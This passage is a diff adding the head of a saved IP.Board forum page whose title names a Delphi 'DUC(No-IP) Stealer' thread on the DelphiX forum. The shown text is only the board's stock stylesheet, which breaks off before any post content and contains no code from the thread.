@@ -1,0 +1,2428 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" lang="en"><head> 
+
+
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
+<link rel="shortcut icon" href="http://www.delphix.org/forum/favicon.ico"><title>[Delphi] DUC(No-IP) Stealer - Fórum DelphiX</title>
+
+ 
+<style type="text/css">
+	/*~START CSS~*/
+
+/*  
+ * CSS for IP.Board 2.3.0
+ * Author: Rikki Tissier, original IP.Board CSS by James Mathias
+ * Copyright: 2005 IPS, Inc, all rights reserved 
+ *
+ * All style attributes in alpha-numeric order starting from 0
+ *
+ */
+
+/* 
+ * ========================================
+ * global element styles 
+ * ========================================
+ */
+
+/* Import the colors */
+@import url(style_images/ip.boardpr/css_colors.css);
+
+/* ----------------------------------- */
+
+
+html{
+	overflow-x: auto; /* fixes MSIE scrollbar bug DO NOT REMOVE, has no effect in Mozilla, or Opera */
+}
+
+body{ 
+	font-family: Arial, Verdana, Tahoma, "Trebuchet MS", Sans-Serif, Georgia, Courier, "Times New Roman", Serif;
+	font-size: 12px;
+	line-height: 135%;
+	margin: 0px;
+	padding: 0px; /* required for Opera to have 0 margin */
+	text-align: center; /* centers board in MSIE */
+}
+
+/* 
+ * ========================================
+ * Set up IPB table
+ * ========================================
+ */
+ 
+.ipbtable { width:100% }
+
+table.ipbtable,
+tr.ipbtable,
+td.ipbtable
+{ /* required for text in tables, because tables do not inherit from body */
+	background: transparent;
+	color: #222;
+	font-size: 12px;
+	line-height: 135%;
+}
+
+.ipbtable td,
+.divpad{ /* gives all tables faux cellpadding of 5px */
+	padding: 5px;
+}
+
+td.nopad{ /* allows some tables to have no padding on the td */
+	padding: 0;
+}
+
+/* Safari... */
+th
+{
+	text-align: left;
+}
+
+
+form{
+	display: inline;
+	margin: 0; /* removes mystery form tag gapping */
+	padding: 0; /* removes mystery form tag gapping */
+}
+
+img{
+	border: 0; /* makes sure linked images do not have a border */
+	vertical-align: middle;
+}
+
+/* 
+ * ========================================
+ * global hyperlink styles 
+ * ========================================
+ */
+
+a:link,
+a:visited,
+a:active{
+	background: transparent;
+	color: #222;
+	text-decoration: underline;
+}
+
+a:hover{
+	background: transparent;
+}
+
+/* 
+ * ========================================
+ * Main wrapper, this controls the overall width of the board in you browser view window. 
+ * ========================================
+ */
+
+#ipbwrapper{ 
+	margin: 15px auto 20px auto; /* centers the box, no matter the overall width, also applies a 20px gap at the top and bottom of the board */
+	text-align: left; /* re_aligns text to left second part of two part MSIE centering workaround */
+	/* EDIT THIS TO CHANGE THE WIDTH OF THE BOARD -> 960px is a common fixed resolution size */
+	width: 98%;
+}
+
+/* 
+ * ========================================
+ * styles for pagination links 
+ * ========================================
+ */
+
+/* @group Pagination */
+
+.pagelink,
+.pagelinklast,
+.pagecurrent,
+.minipagelink,
+.minipagelinklast{
+	background: #d8d8d8;
+	padding: 2px 4px 2px 4px;
+}
+
+.pagelinklast,
+.minipagelinklast{
+	background: #d8d8d8;
+}
+
+
+.pagecurrent{
+
+}
+
+.minipagelink,
+.minipagelinklast{
+	border: 1px solid #C2CFDF;
+	font-size: 10px;
+	margin: 0 1px 0 0;
+}
+
+.pagelink a:active,
+.pagelink a:visited,
+.pagelink a:link,
+.pagelinklast a:active,
+.pagelinklast a:visited,
+.pagelinklast a:link,
+.pagecurrent a:active,
+.pagecurrent a:visited,
+.pagecurrent a:link,
+.minipagelink a:active,
+.minipagelink a:visited,
+.minipagelink a:link,
+.minipagelinklast a:active,
+.minipagelinklast a:visited,
+.minipagelinklast a:link{
+	text-decoration: none;
+}
+
+
+
+/* @end */
+
+/* fake button effect for some links */
+.fauxbutton{
+	font-size: 11px;
+	font-weight: bold;
+	padding: 4px;
+}
+
+.fauxbutton a:link,
+.fauxbutton a:visited,
+.fauxbutton a:active{
+	text-decoration: none;
+}
+
+.forumdesc,
+.forumdesc a:link,
+.forumdesc a:visited,
+.forumdesc a:active{ 
+	background: transparent;
+	font-size: 11px; 
+	color: #666;
+	line-height: 135%;
+	margin: 2px 0 0 0;
+	padding: 0;
+}
+
+/* =================================================================================== */
+/* =================================================================================== */
+/* =================================================================================== */
+
+.searchlite {
+	background-color:yellow;
+	font-weight:bold;
+	color: red;
+}
+
+.activeusers{
+	background: #FFF;
+	border: 3px solid #d7d7d7;
+	color: #000;
+	margin: 0px;
+	padding: 0px;
+}
+
+.activeuserposting a:link,
+.activeuserposting a:visited,
+.activeuserposting a:active,
+.activeuserposting
+{
+	font-style:italic;
+	text-decoration: none;
+	border-bottom:1px dotted black;
+}
+
+fieldset.search{ 
+	line-height: 150%;
+	padding: 6px; 
+}
+
+label{ 
+	cursor: pointer; 
+}
+
+img.attach{ 
+	background: #808080 url(style_images/ip.boardpr/click2enlarge.gif) no-repeat top right;
+	border: 1px solid #808080;
+	margin: 0 2px 0 0;
+	padding: 11px 2px 2px 2px;
+}
+
+li.helprow{ 
+	margin: 0 0 10px 0;
+	padding: 0; 
+}
+
+ul#help{ 
+	padding: 0 0 0 15px; 
+}
+
+.warngood,
+.warnbad{ 
+	color: #0B9500;
+	font-weight: bold;
+}
+
+.warnbad{ 
+	color: #DD0000;
+}
+
+#padandcenter{ 
+	margin: 0 auto 0 auto;
+	padding: 14px 0 14px 0;
+	text-align: center;
+}
+
+#profilename{ 
+	font-size: 28px; 
+	font-weight: bold; 
+}
+
+#photowrap{ 
+	padding: 6px; 
+}
+
+#phototitle{ 
+	border-bottom: 1px solid #000; 
+	font-size: 24px; 
+}
+
+#photoimg{ 
+	margin: 15px 0 0 0;
+	text-align: center; 
+}
+
+/* @group User CP */
+
+#ucpmenu,
+#ucpcontent{ 
+	background: #f3f3f3;
+	border: 1px solid #c4c4c4;
+	padding: 1px;
+	line-height: 150%;
+}
+
+#ucpmenu p{ 
+	margin: 0; 
+	padding: 2px 5px 6px 9px;
+}
+
+#ucpmenu a:link, 
+#ucpmenu a:active, 
+#ucpmenu a:visited{ 
+	text-decoration: none; 
+}
+
+#ucpcontent{ 
+	width: auto;
+}
+
+#ucpcontent p{ 
+	margin: 0;
+	padding: 10px;
+}
+
+
+
+/* @end */
+
+.activeuserstrip{ 
+	background: #BCD0ED;
+	padding: 6px;
+}
+
+/* Topic View elements */
+.signature{  
+	background: transparent;
+	color: #737373; 
+	font-size: 10px;
+	line-height: 150%;
+}
+
+.postdetails{ 
+	font-size: 11px;
+	line-height:140%;
+}
+
+.postcolor{ 
+	font-size: 13px; 
+	line-height: 160%;
+}
+
+.normalname{ 
+	color: #003;
+	font-size: 12px; 
+	font-weight: bold; 
+}
+
+.normalname a:link, 
+.normalname a:visited, 
+.normalname a:active{ 
+	font-size: 12px;
+}
+
+.post_head {
+}
+
+.post1,
+.bg1,
+.post2,
+.bg3,
+.post1.post_left,
+.post2.post_left
+{ 
+}
+
+.row2shaded,
+.post1shaded { background-color: #DEDBE4 }
+.row4shaded,
+.post2shaded { background-color: #E3DFE7 }
+
+.row1{ 
+}
+
+.row2{  
+}
+
+.ipbtable .row1,
+.ipbtable .row2 {
+}
+
+.rowhighlight{
+	background-color: #FFF9BA;
+}
+
+.darkrow1,
+.darkrow3{ 
+}
+
+/* tableborders gives the white column / row lines effect */
+.plainborder,
+.tablefill,
+.tablepad{ 
+	background: #f5f5f5;
+	border: 1px solid #345487;
+}
+
+.tablefill,
+.tablepad{ 
+	padding: 6px;  
+}
+
+.tablepad{ 
+	border: 0 !important;
+}
+
+.wrapmini{ 
+	float: left;
+	line-height: 1.5em;
+	width: 25%;
+}
+
+.pagelinks{
+	float: left;
+	line-height: 1.2em;
+	width: 35%;
+}
+
+.desc{ 
+	font-size: 11px; 
+}
+
+.lastaction
+{
+	font-size: 11px; 
+}
+
+.edit{ 
+	font-size: 9px;
+}
+
+.thin{ 
+	border: 1px solid #FFF;
+	border-left: 0;
+	border-right: 0;
+	line-height: 150%;
+	margin: 2px 0 2px 0;
+	padding: 6px 0 6px 0;
+}
+
+/* @group Calendar */
+
+.calmonths{ 
+	background: #eeeeee;
+	font-size: 18px; 
+	font-weight: bold; 
+	margin: 5px 0 5px 0;
+	padding: 8px;
+	text-align: center;
+}
+
+.weekday{
+	font-size: 14px;
+	font-weight: bold;
+}
+
+.calmonths a{
+	text-decoration: none;
+}
+
+.calday,
+.calweekday{ 
+	background: #e8e8e8;
+	color: #4b4b4b;
+	font-size: 11px;
+	font-weight: bold;
+	margin: 0;
+	padding: 4px;
+	text-align: right;
+}
+
+.calweekday{
+	border-right: 1px solid #AAA;
+	color: #222;
+	font-size: 14px;
+	padding: 6px;
+	text-align: center;
+}
+
+.celltodayshaded,
+.celldateshaded,
+.cellblank,
+.celldate,
+.celltoday,
+.mcellblank,
+.mcelldate,
+.mcelltoday{
+	background: #f5f5f5; 
+	height: 100px;
+	margin: 0;
+	padding: 0;
+	vertical-align: top;
+}
+
+.celltodayshaded,
+.celldateshaded
+{
+	background: #E3DFE7;
+}
+
+.mcellblank,
+.mcelldate,
+.mcelltoday{
+	height: auto;
+}
+
+.cellblank,
+.mcellblank{
+	background: #d1d1d1;
+}
+
+.celltoday,
+.celltodayshaded,
+.mcelltoday{
+	border: 2px solid #8B0000;
+}
+
+.calranged
+{
+	border: 2px outset #C2CFDF;
+	background: #C2CFDF;
+	padding:4px;
+}
+
+.calitem
+{
+	border-bottom: 1px dotted #C2CFDF;
+	padding:4px;
+}
+
+
+
+/* @end */
+
+/* @group Input elements */
+
+.input-warn,
+.input-green,
+.input-checkbox,
+input,
+textarea,
+select{
+	font-family: verdana, helvetica, sans-serif;
+	font-size: 11px;
+	margin: 5px;
+	padding: 2px;
+	vertical-align: middle;
+}
+
+select
+{
+	margin: 0px;
+}
+
+.input-checkbox
+{
+	border: none;
+}
+
+.input-warn,
+.input-warn-content
+{
+	border: 1px solid #C00;
+}
+
+.input-ok,
+.input-ok-content
+{
+	border: 1px solid #0C0;
+}
+
+.input-warn-content
+{
+	padding: 4px;
+	margin: 4px;
+	background-color: #FCC;
+}
+
+.input-ok-content
+{
+	padding: 4px;
+	margin: 4px;
+	background-color: #CFC;
+}
+
+
+.input-text
+{
+	color: #900;
+}
+
+input.button{
+	margin: 0;
+	width: auto;
+	cursor: pointer;
+}
+
+optgroup option{
+	font-family: verdana, helvetica, sans-serif;
+	font-size: 12px;
+}
+
+.codebuttons{ 
+	font-family: Verdana, Helvetica, Sans-Serif; 
+	font-size: 10px; 
+	vertical-align: middle;
+	margin:2px;
+}
+
+.textarea,
+.searchinput,
+.button,
+.gobutton{
+	font-family: Verdana, Helvetica, Sans-Serif;
+	font-size: 11px;
+	padding: 2px;
+	vertical-align: middle;
+}
+	
+.button{
+}
+
+.gobutton{
+	background: transparent;
+	border: 0;
+	color: #072A66;
+	margin: 0;
+	vertical-align: middle;
+}
+
+.radiobutton,
+.checkbox,
+.helpbox { 
+	border: 0;
+	vertical-align: middle;
+	background: transparent;
+}
+
+
+
+/* @end */
+
+.formtable{
+	background: transparent;
+}
+
+.formtable td,
+.pformleft,
+.pformleftw,
+.pformright{
+	border-left: 0;
+	font-weight: bold;
+	margin: 1px 0 0 0;
+	padding: 6px;
+	width: 25%;
+}
+
+.pformleft,
+.pformleftw {
+	background-color: #e4e6e9;
+}
+
+.pformright {
+	background-color: #eff1f3;
+}
+
+.formtable td.wider,
+.pformleftw,
+.pformright{
+	width: 40%;
+}
+
+.formtable td.formright,
+.pformright{
+	border-right: 0px;
+	font-weight: normal;
+	width: auto;
+} 
+
+.formtable td.formtitle,
+.formsubtitle{
+	background: #dcdcdc;
+	border: 1px solid #9FB9D4; 
+	border-bottom: 0;
+	border-left: 0;
+	border-right: 0;
+	font-weight: normal;
+}
+
+.formsubtitle{ 
+	border: 0;
+	color: #474747;
+	font-weight: bold;
+	padding: 5px;
+}
+
+.formtable td.formstrip{
+	background: #DDE8F2;
+	border: 1px solid #9FB9D4;
+	border-left: 0;
+	border-right: 0;
+	font-weight: normal;
+}
+
+/* 
+ * ========================================
+ * new style quote and code wrappers MATT's DESIGN 
+ * ========================================
+ */
+
+.quotetop{
+	background: #E4EAF2 url(style_images/ip.boardpr/css_img_quote.gif) no-repeat right;
+	border: 1px dotted #000;
+	border-bottom: 0;
+	border-left: 4px solid #8394B2;
+	color: #000;
+	font-weight: bold;
+	font-size: 10px;
+	margin: 2px auto 0 auto;
+	padding: 3px;
+}
+
+.quotemain{
+	background: #FAFCFE;
+	border: 1px dotted #000;
+	border-left: 4px solid #8394B2;
+	border-top: 0;
+	color: #465584;
+	padding: 4px;
+	margin: 0 auto 0 auto;
+}
+
+.codetop,
+.sqltop,
+.htmltop{
+	background: #FDDBCC url(style_images/ip.boardpr/css_img_code.gif) no-repeat right;
+	color: #000;
+	font-weight: bold;
+	margin: 0 auto 0 auto;
+	padding: 3px;
+}
+
+.codemain,
+.sqlmain,
+.htmlmain{
+	background: #FAFCFE;
+	border: 1px dotted #000;
+	color: #465584;
+	font-family: Courier, "Courier New", Verdana, Arial;
+	margin: 0 auto 0 auto;
+	padding: 2px;
+}
+
+/* 
+ * ========================================
+ * old school quote and code styles - backwards compatibility 
+ * ========================================
+ */
+
+#QUOTE,
+#CODE{  
+	background: #FAFCFE; 
+	border: 1px solid #000; 
+	color: #465584; 
+	font-family: Verdana, Arial; 
+	font-size: 11px; 
+	padding: 2px; 
+	white-space: normal;
+}
+
+#CODE{ 
+	font-family: Courier, "Courier New", Verdana, Arial;
+}
+
+/* 
+ * ========================================
+ * All New Styles 
+ * ========================================
+ */
+.cleared{
+	clear: both;
+}
+
+.borderwrap,
+.borderwrapm{ /* this will affect the outlining border of all the tables and boxes through-out the skin. */
+	background: #FFF;
+	padding: 1px; 
+	margin: 0px; 
+}
+
+.borderwrapm{
+	margin: 5px;
+}
+
+.borderwrap h3,
+.maintitle,
+.maintitlecollapse{
+	font-size: 13px;
+	font-weight: bold; 
+	margin: 0px;
+	padding: 8px 8px 8px 15px;
+}
+
+.maintitle td { 
+	font-size: 13px;
+	font-weight: bold;
+}
+
+
+.maintitlecollapse{
+}
+
+.maintitle p,
+.maintitlecollapse p,
+.formsubtitle p{
+	background: transparent !important;
+	border: 0 !important;
+	margin: 0 !important;
+	padding: 0 !important;
+}
+
+.maintitle p.expand,
+.maintitle p.goto,
+.maintitlecollapse p.expand,
+.formsubtitle p.members{
+	float: right;
+	width: auto !important;
+}
+
+.maintitle a:link, 
+.maintitle a:visited,
+.maintitlecollapse a:link, 
+.maintitlecollapse a:visited{ 
+	background: transparent;
+	text-decoration: none;
+}
+
+.maintitle a:hover, 
+.maintitle a:active,
+.maintitlecollapse a:hover, 
+.maintitlecollapse a:active{ 
+	background: transparent;
+}
+
+table th,
+.borderwrap table th,
+.subtitle,
+.subtitlediv,
+.postlinksbar{ 
+	font-size: 12px;
+	font-weight: bold;
+	margin: 0; 
+	padding: 5px; 
+}
+
+.subtitlediv{
+	text-align: right;
+}
+
+.borderwrap table th a:link,
+.subtitle a:link,
+.subtitlediv a:link,
+.borderwrap table th a:visited,
+.subtitle a:visited, 
+.subtitlediv a:visited, 
+.borderwrap table th a:active,
+.subtitle a:active,
+.subtitlediv a:active
+{ 
+	background: transparent;
+	text-decoration: none;
+}
+
+.borderwrap table th a:hover,
+.subtitle a:hover,
+.subtitlediv a:hover
+{
+	
+}
+
+.borderwrap h4{
+	background: #DDE6F2;
+	border: 1px solid #FFF;
+	border-bottom: 1px solid #5176B5;
+	border-top: 1px solid #5176B5;
+	color: #5176B5; 
+	font-size: 12px;
+	font-weight: bold; 
+	margin: 0;
+	padding: 5px;
+}
+
+.borderwrap p{
+	background: #F9F9F9;
+	border: 1px solid #CCC;
+	margin: 5px;
+	padding: 10px;
+	text-align: left;
+}
+
+
+td.formbuttonrow,
+.formbuttonrow,
+.pformstrip,
+.borderwrap p.formbuttonrow,
+.borderwrap p.formbuttonrow1{
+	margin: 0px !important;
+	padding: 5px !important;
+	text-align: center;
+}
+
+td.formbuttonrow{
+	border-bottom: 0;
+	border-left: 0;
+	border-right: 0;
+}
+
+.borderwrap p.formbuttonrow1{
+	background: #F9F9F9 !important;
+	border: 0;
+	border-top: 1px solid #CCC;
+}
+
+.bar,
+.barb,
+.barc{
+
+}
+
+.barc{
+	border-bottom: 0;
+}
+
+.bar p,
+.barb p,
+.barc p{
+	background: transparent;
+	border: 0;
+	font-size: 11px;
+	margin: 0;
+	padding: 5px;
+	text-align: left;
+}
+
+.barb p{
+	text-align: right;
+}
+
+.bar p.over,
+.bar p.overs,
+.barc p.over,
+.barc p.overs{
+	float: right;
+}
+
+.barb p.over,
+.barb p.overs{
+	float: left;
+}
+
+.bar p.overs,
+.barb p.overs,
+.barc p.overs{
+	position: relative;
+	top: 5px;
+}
+
+.catend{
+	font-size: 1px;
+	height: 5px;
+}
+
+.newslink{
+	background: #eeeeee;
+	margin: 0;
+	width: 100%;
+}
+
+.newslink td{
+	color: #222;
+	font-size: 11px;
+	padding: 5px 5px 5px 10px;
+}
+
+.newslink span{
+	background: transparent;
+	font-style: italic;
+	font-weight: normal;
+}
+
+.newslink input{
+	font-size: 10px;
+	padding: 3px;
+	vertical-align: middle;
+	width: auto;
+}
+
+.newslink input.button{
+	background: transparent;
+	border: 0;
+	color: #072A66;
+	vertical-align: middle;
+}
+
+.fieldwrap{
+	background: #F9F9F9;
+	border: 1px solid #CCC;
+	border-top: 0;
+	margin: 5px;
+	padding: 0;
+	text-align: left;
+}
+
+.fieldwrap h4{
+	background: #EEE;
+	border: 1px solid #CCC;
+	border-left: 0;
+	border-right: 0;
+	color: #444; 
+	font-size: 12px;
+	font-weight: bold; 
+	margin: 0;
+	padding: 5px;
+}
+
+.errorwrap {
+	background: #F2DDDD;
+	border: 1px solid #992A2A;
+	border-top: 0;
+	margin: 5px;
+	padding: 0;
+}
+
+
+.errorwrap h4 {
+	background: #E3C0C0;
+	border: 1px solid #992A2A;
+	border-left: 0;
+	border-right: 0;
+	color: #992A2A; 
+	font-size: 12px;
+	font-weight: bold; 
+	margin: 0;
+	padding: 5px;
+}
+
+.errorwrap p {
+	background: transparent;
+	border: 0;
+	color: #992A2A;
+	margin: 0;
+	padding: 8px;
+}
+
+
+.ruleswrap{
+	background: #F2DDDD;
+	border: 1px solid #992A2A;
+	color: #992A2A; 
+	margin: 5px 0 5px 0;
+	padding: 5px;
+}
+
+#redirectwrap{
+	background: #FFF;
+	border: 1px solid #c4c4c4;
+	padding: 1px;
+	margin: 200px auto 0 auto;
+	text-align: left;
+	width: 500px;
+}
+
+#redirectwrap h4{
+	font-size: 11px;
+	font-weight: bold;
+	margin: 0; 
+	padding: 5px;
+}
+
+#redirectwrap p{
+	margin: 0;
+	padding: 5px;
+}
+
+#redirectwrap p.redirectfoot{
+	margin: 0px !important;
+	padding: 5px !important;
+	text-align: center;
+}
+
+
+#gfooter{
+	margin: 5px 0 5px 0;
+	padding: 0;
+	width: 100%;
+}
+
+#gfooter td{
+	font-size: 10px;
+	padding: 7px;
+}
+
+#gfooter a:link,
+#gfooter a:visited{
+}
+
+#logostrip{ 
+	height: 116px;
+	margin: 0;
+	padding: 0;
+	text-align: left;
+        background-image: url(style_images/ip.boardpr/logo4.gif);
+}
+
+#logographic{
+	background: transparent url(style_images/ip.boardpr/logo4.gif) no-repeat left;
+	height: 68px;
+	margin: 0;
+	padding: 0;
+}
+
+#submenu{ 
+	margin: 0;
+	height: 30px;
+	text-align: right;
+}
+
+	#submenu_left a {
+		float: left;
+	}
+	
+	#submenu_right a {
+		float: right;
+	}
+	
+	#submenu a {
+		display: block;
+		padding: 7px;
+		text-decoration: none;
+	}
+	
+		#submenu a:hover {
+		
+		}
+
+#userlinks,
+#userlinksguest{ 
+	margin: 0px 0 5px 0;
+	padding: 0 5px 0 5px;
+	clear: both;
+}
+
+#userlinksguest{ 
+	
+}
+
+#userlinks p,
+#userlinksguest p{
+	background: transparent !important;
+	border: 0 !important;
+	font-size: 11px;
+	font-weight: bold; 
+	letter-spacing: 1px;
+	margin: 0 !important;
+	padding: 7px 0 7px 0; 
+	text-align: right;
+}
+
+#userlinks p,
+#userlinksguest p{
+	font-weight: normal;
+	letter-spacing: 0;
+}
+
+#userlinksguest p.pcen{
+	text-align: center;
+}
+
+#userlinks p.home,
+#userlinksguest p.home{
+	float: left;
+}
+
+#navstrip{ 
+	font-size: 12px;
+	font-weight: bold;
+	margin: 0 0 5px 0;
+	padding: 5px 0px 8px 0px; 
+}
+
+#navstrip a:link, 
+#navstrip  a:visited{ 
+	text-decoration: none;
+}
+
+#navstrip a:hover, 
+#navstrip a:active{
+ 
+}
+
+.toplinks{
+	background: transparent;
+	color: #565656;
+	margin: 0;
+	padding: 0 0 5px 0;
+	text-align: right;
+}
+
+.toplinks span{
+	color: #565656;
+	font-size: 11px;
+	font-weight: bold;
+	margin: 0;
+	padding: 5px;
+}
+
+.toplinks a {
+	color: #686868;
+}
+
+.copyright{ 
+	font-size: 11px; 
+	margin: 0 0 5px 0;
+	padding: 8px;
+}
+
+/* @group Print styles */
+
+#print{
+	margin: 20px auto 20px auto;
+	padding: 0;
+	text-align: left;
+	width: 85%;
+}
+
+#print h1,
+#print h2,
+#print h3,
+#print h4,
+#print p{
+	color: #036;
+	font-size: 18px;
+	font-weight: bold;
+	margin: 0;
+	padding: 8px;
+}
+
+#print h2,
+#print h3,
+#print p{
+	border-bottom: 1px solid #999;
+	font-size: 11px;
+	font-weight: normal;
+}
+
+#print h3{
+	background: #F5F5F5;
+	font-size: 12px;
+	font-weight: bold;
+	margin: 0 0 10px 0;
+}
+
+#print h4{
+	background: #F9F9F9;
+	font-size: 11px;
+}
+
+#print p{
+	margin: 0 0 5px 0;
+	padding: 10px;
+}
+
+#print p.printcopy{
+	border: 0;
+	color: #000;
+	text-align: center;
+}
+
+.dny-edit-title
+{
+	border:0px;
+	padding:3px;
+	margin:0px;
+	background: #D1DCEB; 
+	color: #3A4F6C; 
+}
+
+
+
+/* @end */
+
+
+/* ======================================== */
+/* TABS
+/* ======================================== */
+
+.tabon
+{
+	border-width: 1px 1px 0px 1px;
+	border-style: solid;
+	padding:8px;
+	float:left;
+	width:auto;
+	margin-top:1px;
+	font-size:11px;
+}
+
+.taboff
+{
+	border-width: 1px 1px 0px 1px;
+	border-style: solid;
+	padding:8px;
+	float: left;
+	width: auto;
+	margin-top:1px;
+	font-size:11px;
+}
+
+.tabon a:link, 
+.tabon a:visited, 
+.tabon a:active
+{
+	text-decoration:none;
+}
+
+.taboff a:link, 
+.taboff a:visited, 
+.taboff a:active
+{
+	text-decoration:none;
+}
+
+.mya-back
+{
+	background: #eaeaea;
+	margin:1px;
+	padding: 1px;
+}
+
+.mya-content
+{
+	background: #FFF;
+	padding:8px;
+	margin: 1px;
+	border: 1px solid #777;
+}
+
+.mya-content-tbl
+{
+   background: #F0F5FA;
+   border: 1px solid #777;
+   text-align:left;
+   font-size:10px;
+   white-space:nowrap;
+   margin:1px;
+}
+
+.mya-fieldwrap
+{
+	background: transparent;
+	margin-top: 2px;
+	margin-bottom: 2px;
+	padding: 4px;
+	border: 1px solid #C5C7CD;
+	-moz-border-radius: 5px;
+	width: auto;
+	display: block;
+}
+
+/* -------------------------------- */
+/* Create PM box defaults           */
+/* -------------------------------- */
+
+.iframeshim
+{
+	position:absolute;
+	display:none;
+	background: #FFF;
+	border:0px;
+	width:auto;
+	height:auto;
+}
+
+
+
+/* -------------------------------- */
+/* Experimental                     */
+/* -------------------------------- */
+
+/* @group Popup Menus */
+
+.popupmenu,
+.popupmenu-new
+{
+   background: #f4f4f4;
+   border: 1px solid #989898;
+   text-align:left;
+   font-size:11px;
+   white-space:nowrap;
+   /*padding:3px 5px 3px 3px;*/
+   /*width:300px;*/
+}
+
+.popupmenu-item
+{
+	padding: 5px;
+	/*margin-top:4px;*/
+	white-space: nowrap;
+	border-bottom: 1px solid #d0d0d0;
+	color:  #000000;
+	font-weight: normal;
+}
+
+.popupmenu-item-last
+{
+	padding: 5px;
+	/*margin-top:4px;*/
+	white-space: nowrap;
+	color:  #000000;
+	font-weight: normal;
+}
+
+.popmenubutton-new,
+.popmenubutton
+{
+	white-space:nowrap;
+	background-color: #f0f0f0;
+	border: 1px solid #adadad;
+	color: #30343b;
+	font-weight:bold;
+	float:right;
+	text-align:center;
+	margin:0px;
+	font-size:11px;
+	padding: 2px 8px 2px 8px;
+}
+
+.popmenubutton-new,
+.popmenubutton-new-out
+{
+	float:none;
+	width:auto;
+	text-align:left;
+	height:auto;
+	padding:4px;
+	font-weight:normal;
+	background-color:#f0f0f0;
+	background-image: url(style_images/ip.boardpr/menu_action_down-padded.gif);
+	background-repeat: no-repeat;
+	background-position: right;
+}
+
+.popmenubutton-new-out
+{
+	padding: 4px;
+	background-color:#dce1e8;
+	border: 1px solid #a9b0bb;
+}
+
+
+.popupmenu-new
+{
+	background-color: #f4f4f4;
+}
+
+.maintitle .popmenubutton {
+	margin: -3px 0px -3px 5px;
+}
+
+.popmenubutton a:link, 
+.popmenubutton a:visited,
+.popmenubutton-new a:link, 
+.popmenubutton-new a:visited,
+.popmenubutton-new-out a:link,
+.popmenubutton-new-out a:visited,
+.popupmenu-item a:link, 
+.popupmenu-item a:visited,
+.popupmenu-item-last a:link, 
+.popupmenu-item-last a:visited
+{ 
+	text-decoration: none;
+	-moz-outline: none;
+}
+
+.popmenubutton a:hover,
+.popmenubutton-new a:hover,
+.popupmenu-item a:hover, 
+.popupmenu-item-last a:hover
+{  
+	text-decoration: none;
+}
+
+.popupmenu-category
+{
+	background-color: #aaaaaa; 
+	color: #464646; 
+	font-size: 11px;
+	font-weight: bold; 
+	letter-spacing: 1px;
+	margin: 0; 
+	padding: 5px; 
+}
+
+
+
+/* @end */
+
+/* -------------------------------- */
+/* Loading box
+/* -------------------------------- */
+
+#loading-layer-inner
+{
+	width:220px;
+	height:28px;
+	padding:18px 10px 10px 10px;
+	text-align:center;
+	color: #000;
+	border: 1px solid;
+	border-color:#CCC #666 #666 #CCC;
+	background-color: #FCF8C7;
+}
+
+/* -------------------------------- */
+/* Message in a bo(x|ttle)
+/* -------------------------------- */
+
+#ipd-msg-wrapper
+{
+	display: none;
+	width: 220px;
+}
+
+#ipd-msg-inner
+{
+	width:100%;
+	height:45px;
+	padding: 6px 4px 4px 4px;
+	margin: 0px;
+	text-align:center;
+	color: #000;
+	border: 1px solid;
+	border-color:#ccc #666 #666 #ccc;
+	background-color: #FCF8C7;
+	filter:alpha(opacity=75);
+	opacity:.75
+}
+
+#ipd-msg-title
+{
+	width: 100%;
+	height:20px;
+	margin: 0px;
+	padding: 6px 4px 4px 4px;
+	background: transparent url(style_images/ip.boardpr/css_pp_header.gif);
+	border: 1px solid #3A4F6C;
+	border-bottom: 0px;
+	color: #FFF;
+}
+
+.linked-image
+{
+	margin: 0px;
+	padding: 0px;
+	border: 0px;
+}
+
+.resized-linked-image
+{
+	margin: 1px 0px 0px 0px;
+	padding: 0px;
+	background-color: #000;
+	border: 0px;
+	color: #FFF;
+	font-size: 10px;
+	width: auto;
+	-moz-border-radius-topleft: 7px;
+	-moz-border-radius-topright: 7px;
+}
+
+.resized-linked-image-zoom
+{
+	width: 200px;
+	height: 30px;
+	filter:alpha(opacity=85);
+	opacity:.85;
+	background-color: #FFF;
+	padding-top: 6px;
+	padding-left: 5px;
+	top: 0px;
+	left: 0px;
+	position: absolute;
+	display: none;
+}
+
+/* -------------------------------- */
+/* Edit post reason
+/* -------------------------------- */
+
+.post-edit-reason
+{
+	background: #E7EAEF;
+	margin-top: 9px;
+	margin-bottom: 0px;
+	padding: 4px;
+	color: #333;
+	font-size: 10px;
+	border: 1px solid #C5C7CD;
+	-moz-border-radius: 5px;
+	width: auto;
+	display: block;
+}
+
+/* -------------------------------- */
+/* Personal Profile
+/* -------------------------------- */
+
+.pp-name
+{ 
+	background: #eeeeee;
+	margin: 0px;
+	padding: 10px;
+}
+
+/* @group Personal Profile */
+
+.pp-name h3
+{
+	margin:0px;
+	padding:0px 0px 5px 0px;
+	font-size:24px;
+}
+
+.pp-header
+{ 
+	font-size: 10px;
+	font-weight: bold; 
+	margin: 0px 0px 1px 0px; 
+	padding: 5px; 
+}
+
+.pp-title
+{
+	font-size: 12px;
+	font-weight: bold; 
+	margin: 0px;
+	padding: 8px;
+}
+
+.pp-datebox
+{
+	text-align: center;
+	background: #FFFFFF;
+	border: 1px solid #8e8e8e;
+	padding: 4px;
+	margin: 0px;
+	font-size:18px;
+	font-weight:bold;
+	line-height: 100%;
+	letter-spacing: -1px;
+	float:right;
+	width: auto;
+}
+
+.pp-datebox em
+{
+	color: #AAA;
+	font-weight: normal;
+	font-style: normal;
+}
+
+.pp-contentbox-back
+{
+	background-color: #cacaca;
+	padding: 6px;
+}
+
+.pp-contentbox-entry,
+.pp-contentbox-entry-noheight,
+.pp-contentbox-entry-noheight-mod,
+.pp-contentbox-entry-noheight-sel
+{
+	background-color: #f7f7f7;
+	border: 1px solid #8e8e8e;
+	line-height: 140%;
+	padding: 8px;
+	margin-bottom: 6px;
+	height: 200px;
+	overflow: auto;
+	overflow-x: auto;
+}
+
+.pp-contentbox-entry-noheight-sel
+{
+	background-color:#FCECCD;
+}
+
+.pp-contentbox-entry-noheight-mod
+{
+	background-color:#FDF1DA;
+}
+
+.pp-contentbox-entry-noheight,
+.pp-contentbox-entry-noheight-mod,
+.pp-contentbox-entry-noheight-sel
+{
+	height: auto;
+	margin-bottom: 1px;
+}
+
+.pp-image-thumb-wrap,
+.pp-image-thumb-wrap-floatright,
+.pp-image-mini-wrap,
+.pp-image-mini-wrap-floatright
+{
+	width: 52px;
+	height: 52px;
